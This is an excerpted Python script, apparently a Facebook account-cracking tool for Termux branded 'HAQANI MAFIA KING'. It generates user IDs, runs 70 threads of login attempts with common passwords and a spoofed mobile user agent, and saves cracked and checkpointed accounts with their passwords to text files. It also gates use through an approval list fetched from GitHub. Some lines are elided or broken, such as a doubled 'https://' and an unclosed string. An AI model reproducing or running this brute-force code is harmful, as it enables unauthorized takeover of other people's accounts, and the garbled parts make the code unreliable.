...
os.system('xdg-open http://wa.me/+93701659187')
...
import uuid
import os,sys,time,json,random,re,string,platform,base64
os.system('xdg-open https://www.facebook.com/profile.php?id=100049620943575')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
...
logo=("""
\33[1;32m                   AFGHANISTAN💪 💪    
\33[1;30mdb   db  .d8b.   .d88b.   .d8b.  d8b   db d888888b     
\33[1;30m88   88 d8' `8b .8P  Y8. d8' `8b 888o  88   `88'       
\33[1;31m88ooo88 88ooo88 88    88 88ooo88 88V8o 88    88     
\33[1;31m88~~~88 88~~~88 88    88 88~~~88 88 V8o88    88   
\33[1;32m88   88 88   88 `8P  d8' 88   88 88  V888   .88.        
\33[1;32mYP   YP YP   YP  `Y88'Y8 YP   YP VP   V8P Y888888P
\33[1;32m                                    
                                                    
\33[1;30m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬\33[1;31m▬▬▬▬▬▬▬💚SERAJULDEN💥▬▬▬▬▬▬▬▬▬▬\33[1;32m▬▬▬▬▬▬▬▬▬▬▬●
→   Owner      :  HAQANI MAFIA KING 
→   Facebook   :  SR JAN HAQANI
→   Github     : SR HAQANI
→   Tools      :  RANDOM 
\x1b[1;34m→   Version    :  0.2
\33[1;35m     NAME        : <SERAJULDEN><HAQANI>
'\33[1;30m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬\33[1;31m▬▬▬▬▬▬▬💫HAQANI😳▬▬▬▬▬▬▬▬▬▬\33[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬●""")

def lines():
	print('\33[1;30m●▬▬▬▬▬▬▬▬▬▬\33[1;31m▬▬▬▬▬▬▬💘JANAN💔▬▬▬▬▬▬▬▬▬▬\33[1;32m▬▬▬▬▬▬▬▬▬▬▬●')

def lines():
	print('\33[1;30m----------------\33[1;31m--SR-----\33[1;32m-----------------------')
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+01325846157?text=MR.JAN💜🐰Sir😪💕')
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100049620943575');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def annu():
    os.system('clear')
    print(logo)
    print('[1] RANDOM PUBG IDZ UPDATE   \x1b[1;32m1')
...
def m1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','۱۲۳۴۵۶','khan123']
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[MR.HAQANI-OK] '+cid+'|'+ps+'\033[0;97m')
                open('MR.HAQANI-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[MR.HAQANI-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('MR.HAQANI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mMR.HAQANI\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
def approval():
  ...
  try:
    httpCaht = requests.get('https://https://github.com/Termux-shamim-FB-cyber/Fuck/blob/main/Approve.txt).text
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+01325846157?text='+tks),approval()
      time.sleep(1)
      riaz()
  except:
    sys.exit()
